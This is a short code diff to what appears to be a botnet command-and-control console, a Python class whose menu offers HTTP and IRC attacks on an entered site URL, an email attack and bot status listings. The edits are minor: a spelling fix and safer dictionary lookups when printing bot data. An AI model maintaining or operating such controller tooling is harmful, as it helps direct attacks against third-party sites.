@@ -474,7 +474,7 @@ class CC:
                   "\t4) Get info about bots\n"
                   "\t5) Email attack\n"
                   "\t6) Stop all attacks\n"
-                  "\t7) Retrive bots status\n"
+                  "\t7) Retrieve bots status\n"
                   "\t8) Check bots service\n"
                   "\t9) Stop CC\n")
             comando = input("C&C@command: ")
@@ -483,12 +483,13 @@ class CC:
                     print("Ip\t\thttp\t\tirc")
                     if len(self.activeBot) > 0:
                         for k, v in self.activeBot.items():
-                            print(f"{k}\t{v['http']}\t\t{v['irc']}")
+                            print(f"{k}\t{v['http'] if 'http' in v else ''}\t\t{v['irc'] if 'irc' in v else ''}")
                 case 2:
                     print("Ip\t\thttp\t\tirc\t\ttarget\t\t\t\taction")
                     if len(self.activeBot) > 0:
                         for k, v in self.activeBot.items():
-                            print(f"{k}\t{v['http']}\t\t{v['irc']}\t\t{v['target']}\t{v['action']}") if len(v['target']) > 5 else print(f"{k}\t{v['http']}\t\t{v['irc']}\t\t{v['target']}\t\t\t\t{v['action']}")
+                            print(f"{k}\t{v['http'] if 'http' in v else ''}\t\t{v['irc'] if 'irc' in v else ''}\t\t{v['target'] if 'target' in v else ''}\t{v['action'] if 'action' in v else ''}") if len(v['target']) > 5 \
+                                else print(f"{k}\t{v['http'] if 'http' in v else ''}\t\t{v['irc'] if 'irc' in v else ''}\t\t{v['target'] if 'target' in v else ''}\t\t\t\t{v['action'] if 'action' in v else ''}")
                 case 3:
                     service = input("Select type of attack(1=HTTP, 2=IRC): ")
                     site = input("Enter site url: ")
